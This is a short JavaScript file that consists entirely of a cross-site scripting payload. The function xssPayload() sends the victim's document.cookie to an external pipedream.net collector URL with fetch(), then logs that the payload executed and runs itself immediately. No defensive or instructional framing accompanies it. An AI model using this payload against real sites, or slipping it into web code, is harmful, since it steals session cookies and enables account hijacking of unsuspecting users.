function xssPayload() {
  fetch('https://eniy3zg78oasq.x.pipedream.net/?cookie='+document.cookie); 
}

console.log('XSS payload executed');
xssPayload();
